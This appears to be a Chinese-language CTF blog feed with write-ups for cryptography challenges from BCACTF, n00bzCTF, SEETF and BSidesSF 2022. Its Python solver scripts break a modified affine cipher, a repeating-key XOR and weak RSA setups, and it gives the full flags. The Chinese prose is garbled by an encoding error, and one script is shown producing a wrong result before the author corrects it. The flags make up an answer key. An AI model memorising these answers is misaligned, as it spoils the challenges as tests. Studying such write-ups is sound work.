class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest() == <span class="hljs-built_in">hash</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(i))<br>        <span class="hljs-keyword">break</span><br> <br><span class="hljs-comment"># bca4</span><br></code></pre></td></tr></table></figure><p>ä¹‹åä½¿ç”¨adminç™»å½•ã€‚</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># bcactf&#123;1</span>_<span class="hljs-number">10</span>v<span class="hljs-number">3</span>_<span class="hljs-number">5</span>a<span class="hljs-number">1</span>ty_h@<span class="hljs-number">5</span>h_br<span class="hljs-number">0</span>w<span class="hljs-symbol">n5</span>_<span class="hljs-number">3749</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="a-fine-line"><a class="markdownIt-Anchor" href="#a-fine-line"></a> A Fine Line</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">I<span class="hljs-comment">&#x27;m carefully drawing a fine line on this piece of paper, letting each portion guide the next... (Digits and letters are 0-9 and 10-35 in their usual orders, and the underscore is 36. &#123;&#125; are not encoded but should be added in afterwards. All letters are lowercase.)</span><br><br>Hint <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">2</span><br>This uses the affine cipher, <span class="hljs-keyword">as</span> clued <span class="hljs-keyword">by</span> the title <span class="hljs-built_in">and</span> description, but <span class="hljs-keyword">with</span> an added modification.<br><br>Hint <span class="hljs-number">2</span> <span class="hljs-keyword">of</span> <span class="hljs-number">2</span><br><span class="hljs-keyword">Each</span> pair <span class="hljs-keyword">of</span> letters decodes the <span class="hljs-keyword">next</span>.<br></code></pre></td></tr></table></figure><p>ä¸‹è½½ä¸‹æ¥é‡Œé¢æ˜¯ä¸€ä¸²å­—ç¬¦ï¼Œæç¤ºè¯´æ˜¯æ”¾å°„å¯†ç ã€‚ç„¶åç è¡¨ä¹Ÿç»™æˆ‘ä»¬äº†ã€‚æç¤ºäºŒè¯´ä¸¤ä¸ªå­—ç¬¦è§£ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚æ‰€ä»¥å°±å¯ä»¥å¾—åˆ°è§£æ³•äº†ã€‚</p><p>æ”¾å°„å¯†ç ä¸€å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œä¸€ä¸ªä¹˜æ•°ä¸€ä¸ªåŠ æ•°å’Œä¸€ä¸ªæ¨¡æ•°ã€‚æ¨¡æ•°å®é™…ä¸Šæ˜¯ç è¡¨çš„é•¿åº¦ï¼Œæ‰€ä»¥æ˜¯å›ºå®šçš„ã€‚é‚£ä¹ˆä¸¤ä¸ªå­—ç¬¦è§£ä¸‹ä¸€ä¸ªå…¶å®å°±æ˜¯ä¸¤ä¸ªå­—ç¬¦ä½œä¸ºä¹˜æ•°å’ŒåŠ æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>c = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;(bc)bx6ez_unufi3bm0r0xeb&quot;</span>.replace(<span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>char_set = string.digits + string.ascii_lowercase + <span class="hljs-string">&quot;_&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)-<span class="hljs-number">2</span>) :<br>    key = c[i:i+<span class="hljs-number">1</span>]<br>    mul = char_set.find(key[<span class="hljs-number">0</span>])<br>    add = char_set.find(key[<span class="hljs-number">0</span>])<br>    mul_ = inverse(mul, <span class="hljs-built_in">len</span>(char_set))<br>    <br>    c[i+<span class="hljs-number">2</span>] = char_set[(mul_*(char_set.find(c[i+<span class="hljs-number">2</span>]))) % <span class="hljs-built_in">len</span>(char_set)]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(c))<br><br><span class="hljs-comment"># bc1c6wcfl4cdknw9030b01</span><br></code></pre></td></tr></table></figure><p>å—¯â€¦å¥½åƒä¸å¤ªå¯¹ã€‚</p><p>æœ€åå‘ç°æ˜¯æˆ‘ä»¬å¯¹æç¤ºçš„ç†è§£é”™äº†ï¼Œæˆ‘ä»¥ä¸ºæ˜¯ä¸¤ä¸ªå­—ç¬¦è§£ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼Œå®é™…ä¸Šæ˜¯ä¸¤ä¸ªå­—ç¬¦è§£ä¸‹ä¸¤ä¸ªå­—ç¬¦â€¦è€Œä¸”ç®—æ³•å†™çš„ä¹Ÿæœ‰ç‚¹é—®é¢˜ï¼Œæ”¹ä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>c = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;(bc)bx6ez_unufi3bm0r0xeb&quot;</span>.replace(<span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>char_set = string.digits + string.ascii_lowercase + <span class="hljs-string">&quot;_&quot;</span><br>c = [c[<span class="hljs-number">2</span>*i:<span class="hljs-number">2</span>*i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)//<span class="hljs-number">2</span>)]<br><br>key = c[<span class="hljs-number">0</span>]<br>res = [<span class="hljs-string">&quot;bc&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c[<span class="hljs-number">1</span>:] :<br>    mul = char_set.index(key[<span class="hljs-number">0</span>])<br>    add = char_set.index(key[<span class="hljs-number">1</span>])<br>    mul_ = inverse(mul, <span class="hljs-built_in">len</span>(char_set))<br><br>    key = char_set[mul_*(char_set.index(i[<span class="hljs-number">0</span>]) - add) % <span class="hljs-built_in">len</span>(char_set)] + \<br>            char_set[mul_ * (char_set.index(i[<span class="hljs-number">1</span>]) - add) % <span class="hljs-built_in">len</span>(char_set)]<br><br>    res.append(key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(res))<br><br><span class="hljs-comment"># bcactfg2b_npjs3p4d65k1</span><br><span class="hljs-comment"># bcactf&#123;g2b_npjs3p4d65k1&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>Crypto</tag>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>n00bzCTF SEETF2022</title>
    <link href="/2022/06/09/n00bzCTF-SEETF2022/"/>
    <url>/2022/06/09/n00bzCTF-SEETF2022/</url>
    
    <content type="html"><![CDATA[<p>n00bz CTF ä¸ SEETF 2022çš„ä¸€äº›é¢˜ã€‚</p><span id="more"></span><p>è¿™ä¸¤ä¸ªéƒ½æ²¡æœ‰æ€ä¹ˆæ‰“ï¼Œå†™äº†å‡ é“ç®€å•çš„å°±æ¶¦äº†ã€‚n00bzçš„æœåŠ¡å™¨ç‚¸äº†ä¸€å¤©æ‰å¥½ï¼Œè¿˜æœ‰é™„ä»¶ç¼–ç é”™è¯¯çš„é—®é¢˜ï¼Œ ğŸ˜¦</p><h1 id="n00bz-ctf"><a class="markdownIt-Anchor" href="#n00bz-ctf"></a> n00bz CTF</h1><p>2022/6/5</p><p>å¥½ï¼Œå¬åå­—å°±éå¸¸é€‚åˆæˆ‘ã€‚</p><p>è¿™é¢˜å…¨éƒ¨éƒ½æ˜¯ç”¨Discordå‘çš„ï¼Œä¸€å¼€å§‹æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°é¢˜ç›®é™„ä»¶â€¦ åé¢çœ‹discordé‡Œé¢è®¨è®ºå¥½åƒæ˜¯ç½‘ç«™å‡ºé—®é¢˜æ²¡æ³•æ˜¾ç¤ºé“¾æ¥ã€‚</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><h3 id="playing-with-xor"><a class="markdownIt-Anchor" href="#playing-with-xor"></a> Playing with xor</h3><p>è¿™é¢˜é¢˜ç›®å…¶å®è®²çš„ä¸å¤ªæ¸…æ¥šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br>flag = <span class="hljs-string">b&#x27;n00bz&#123;pREDACTED&#125;&#x27;</span><br>key1 = <span class="hljs-string">b&#x27;REDACTED&#x27;</span><br>enc = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>enc += xor(key1[i],flag[i])<br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-comment"># _\x03\x03U\x11\x1e\t]\x07J\x06\x05\x02&amp;F\x02G_4\x1dICl^\x07\x19V&amp;]\x02X\x044\x15\x15\x05J\x02Y\x0c:\x0e\x00G[h\rT\x0b\x02N</span><br><br></code></pre></td></tr></table></figure><p>é€šè¿‡ä¸€å¼€å§‹çš„æ˜æ–‡ bâ€™n00bz{pâ€˜ å¯ä»¥è§£å‡ºä¸€ä¸ª 1337keyã€‚ç„¶åå¾ªç¯ç”¨è¿™ä¸ªè¿›è¡Œå¼‚æˆ–å³å¯å¾—åˆ°ç»“æœã€‚</p><p>ä¸€å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯æ–°æ¥å‡ºæ¥çš„keyä¼šç”¨åˆ°ä¸‹ä¸€æ®µæ˜æ–‡çš„åŠ å¯†ï¼Œæ²¡æƒ³å°±è¿™ä¸€ä¸ªå¯†é’¥ï¼Œä»–è¿™ä¸ªåŠ å¯†å‡½æ•°æå¾—å¥½åƒkeyå’Œflagä¸€æ ·é•¿ä¸€æ ·ã€‚å±å®æœ‰äº›è¿·æƒ‘ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><br>out = <span class="hljs-string">b&#x27;_\x03\x03U\x11\x1e\t]\x07J\x06\x05\x02&amp;F\x02G_4\x1dICl^\x07\x19V&amp;]\x02X\x044\x15\x15\x05J\x02Y\x0c:\x0e\x00G[h\rT\x0b\x02N&#x27;</span><br><br>flag = [<span class="hljs-string">b&#x27;n00bz&#123;p&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(out)//<span class="hljs-number">7</span>):<br>    flag.append(strxor(<span class="hljs-string">b&#x27;1337key&#x27;</span>, out[<span class="hljs-number">7</span>*i:<span class="hljs-number">7</span>*i+<span class="hljs-number">7</span>]))<br>flag.append(strxor(<span class="hljs-string">b&#x27;13&#x27;</span>, out[<span class="hljs-number">49</span>:]))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;&#x27;</span>.join(flag))<br><br><span class="hljs-comment"># n00bz&#123;pl4y1ng_w1th_x0r_m0r3_l1k3_pl4y1ng_w1th_f1r3&#125;</span><br></code></pre></td></tr></table></figure><h3 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h3><p>é™„ä»¶ç½‘ç«™å´©äº†æ‹¿ä¸åˆ°ä»£ç ã€‚å…ˆæ”¾ç€ã€‚</p><p>åé¢ä»discordé‡Œé¢çœ‹åˆ°åˆ«äººå‘äº†è¿™ä¸ªæ–‡ä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ct = 68915718021581205938132340378</span><br><span class="hljs-comment"># n = 22964326243465188806208175092817347325223751455203934839482603060029805229708465878030254819573089332477084079330445929855173787412006349904864930449245982063200060526847746608051441362052994064461426109292644943462306467765210530381760387813568149905672759271878822092979239650360475796179311415340966347044401497301347973838444826544061998479163636946750265778097717211762208385963205388216125639236403616607313423716206061201112615302831337395011064188536794425701313580122604533837935452384701344503773605128479669035610395170026350607423780797383865621285538151344219282466601404674101508588637419153433890102137</span><br><span class="hljs-comment"># s = 6747770137526404810839680591618349902868945426501581276399132116507818856417271976886226143238796548185022079396435297411063351895882402872038955136430497260880818613647851713479263986391308789043197324119239260033630040630976512064481721240642729114116561261667588426398515959668695454587899042998666589705506998832917739337175589667828567571421541128057015371328723095841794613223799998429126797512729366352049800447550388154359724453576012916007310993864290045596969157854816882402679820492333445924724199994952395214639223249892224753494733720946542351810699104265693993026233289328344375145590992008664182919067</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>flag = <span class="hljs-string">b&#x27;REDACTED&#x27;</span><br>flag_int = bytes_to_long(flag)<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>ct = <span class="hljs-built_in">pow</span>(flag_int,e,n)<br><span class="hljs-comment">#assert ct = 0xdeadbeefdeadbeefdeadbeef + 1337 + 1337 + 1337</span><br>d = inverse(e,phi)<br>s = <span class="hljs-built_in">pow</span>(flag_int,d,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;s = <span class="hljs-subst">&#123;s&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;ct = <span class="hljs-subst">&#123;ct&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç»™å‡ºäº†må¯¹eçš„åŠ å¯†å’Œmå¯¹dåŠ å¯†ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬æœ‰</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup><mo>=</mo><mi>c</mi><mi>t</mi><mtext>â€‰</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>â€‰</mtext><mi>n</mi><mspace linebreak="newline"></mspace><msup><mi>m</mi><mi>d</mi></msup><mo>=</mo><mi>s</mi><mtext>â€‰</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>â€‰</mtext><mi>n</mi><mspace linebreak="newline"></mspace><mi>e</mi><mi>d</mi><mo>=</mo><mn>1</mn><mtext>â€‰</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>â€‰</mtext><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m^e = ct \, mod \,n \\ m^d = s \, mod \,n \\ ed = 1 \, mod \,(p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><p>emm, æƒ³äº†ä¸€ä¸‹æ²¡æƒ³å‡ºæ¥æ€ä¹ˆå†™ï¼Œä½†æ˜¯è¿™ä¸ªså®é™…ä¸Šmçš„ç­¾åå•Šã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ç›´åˆ°å…¬é’¥eå°±è¡Œäº†ã€‚ä¸€èˆ¬æ¥è¯´å…¬é’¥åŸºæœ¬ä¸Šéƒ½æ˜¯0x10001ä¹Ÿå°±æ˜¯65537ã€‚æ‰€ä»¥æˆ‘å°±è¯•äº†ä¸€ä¸‹ç›´æ¥ç”¨0x10001å¯¹sè¿›è¡ŒéªŒè¯ã€‚æ²¡æƒ³åˆ°è¿˜çœŸæ˜¯ã€‚</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># n00</span>bz&#123;pl<span class="hljs-number">34</span>s<span class="hljs-number">3</span>_s<span class="hljs-number">1</span>g<span class="hljs-symbol">n_h3</span>r<span class="hljs-number">3</span>_<span class="hljs-number">4</span><span class="hljs-symbol">nd_h3</span>r<span class="hljs-number">3</span>_<span class="hljs-number">4</span><span class="hljs-symbol">nd_h3</span>r<span class="hljs-number">3.</span>..&#125;<br></code></pre></td></tr></table></figure><h1 id="seetf-2022"><a class="markdownIt-Anchor" href="#seetf-2022"></a> SEETF 2022</h1><p>2022/6/5</p><p>æœ€åå››ä¸ªå°æ—¶çœ‹çœ‹ã€‚</p><h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> Crypto</h2><h3 id="close-enough"><a class="markdownIt-Anchor" href="#close-enough"></a> Close Enough</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag, getNextPrime<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getNextPrime(p)<br>n = p * q<br>e = <span class="hljs-number">65537</span><br><br>key = RSA.construct((n, e)).export_key().decode()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(key)<br><br>m = bytes_to_long(flag.encode())<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç´ æ•°æ˜¯ä¸¤ä¸ªç›¸é‚»çš„ç´ æ•°ã€‚</p><p>nä½¿ç”¨è¯ä¹¦æ ¼å¼ç»™å‡ºçš„ã€‚ç”¨ä»¥ä¸‹ç½‘ç«™è¿›è¡Œè¯»å–ã€‚</p><p><a href="https://the-x.cn/zh-cn/encodings/Asn1.aspx">https://the-x.cn/zh-cn/encodings/Asn1.aspx</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> libnum<br>n = <span class="hljs-number">0x4A4BFC4EB9E6FC4B2858B242F09B60D38687DC7970EAEF7A4D96EEC20307F5AD36057D85206E268AAA439FC930EEACB3955E15A7C1C982468F47C14504C871B7B305D2E4EA121A61C7A6532FF1CAD32E563EFE10A91059CB48F0DC9E5EC723B6BFA29ACAA4281E8993A9844888866F31510AA2BD6A99BC6CDE57D11F8DE68068F973B6EDE7B91C9F71C323AA8CEB794DB47FC48D49AF700FABCAAAD020BE3BF755AA6F95154745F3EF9560ABD3D544F16D6ACDD5AF9345D69F28A177EDECB0280A057A62AF29404F5596664E9DDD1CAA6E1EDB893A5E56ACE8BC4159A50AE6D93F189BA4CC4646C898BA3D39B10EC95BCFDD3C94394B5A9600E1D626AA1D6927</span><br>e = <span class="hljs-number">0x10001</span><br>sqrt = gmpy2.iroot(n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>p = sympy.nextprime(sqrt)<br>q = sympy.prevprime(sqrt)<br><span class="hljs-keyword">assert</span> p*q == n<br><br>c = <span class="hljs-number">4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017</span><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(gmpy2.powmod(c, gmpy2.invert(e, p-<span class="hljs-number">1</span>), p))))<br><br><span class="hljs-comment"># SEE&#123;i_love_really_secure_algorithms_b5c0b187fe309af0f4d35982fd961d7e&#125;</span><br></code></pre></td></tr></table></figure><p>å…¶ä»–çš„åº”è¯¥æ²¡æ—¶é—´å†™äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BSidesSF CTF 2022</title>
    <link href="/2022/06/06/BSidesSF-CTF-2022/"/>
    <url>/2022/06/06/BSidesSF-CTF-2022/</url>
    
    <content type="html"><![CDATA[<p>BSidesSF CTF 2022 ä¸­ rsalab çš„é¢˜è§£ã€‚</p><span id="more"></span><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="rsalab"><a class="markdownIt-Anchor" href="#rsalab"></a> rsalab</h2><p>è¿™é¢˜å…¶å®æ˜¯ä¸‰é¢˜ã€‚ä¸€å…±ä¸‰ä¸ªflagã€‚ncè¿ä¸Šä¸€å…±æœ‰8é¢˜ï¼Œå¯ä»¥ç®—æ˜¯å¯¹RSAç®—æ³•çš„æ”»å‡»çš„ä¸€ä¸ªæ€»ç»“å…¥é—¨ã€‚è¿™ç§é¢˜æˆ‘è§‰å¾—è¿˜ä¸é”™ã€‚</p><h3 id="beginner"><a class="markdownIt-Anchor" href="#beginner"></a> beginner</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><pre><code class="hljs vbnet">Challenge <span class="hljs-number">1</span>:<br><br>Before your start <span class="hljs-keyword">on</span> attacking RSA, it<span class="hljs-comment">&#x27;s important to first understand</span><br>basic RSA operations <span class="hljs-built_in">like</span> encryption <span class="hljs-built_in">and</span> decryption. <span class="hljs-keyword">For</span> this<br>challenge, we have generated a <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>. Your job <span class="hljs-built_in">is</span> <span class="hljs-keyword">to</span> encrypt the<br>provided message <span class="hljs-keyword">with</span> that <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the ciphertext.<br><br>RSA encryption uses the encrypting exponent, e. Decryption <span class="hljs-built_in">is</span> the same<br>mathematical operation except that it uses the decrypting exponent, d.<br><span class="hljs-keyword">If</span> you can encrypt <span class="hljs-keyword">with</span> the provided e <span class="hljs-keyword">then</span> you could decrypt (<span class="hljs-keyword">if</span> you<br>had d) just <span class="hljs-keyword">as</span> easily.<br><br>== Generated <span class="hljs-keyword">Public</span> <span class="hljs-keyword">Key</span> ==<br><span 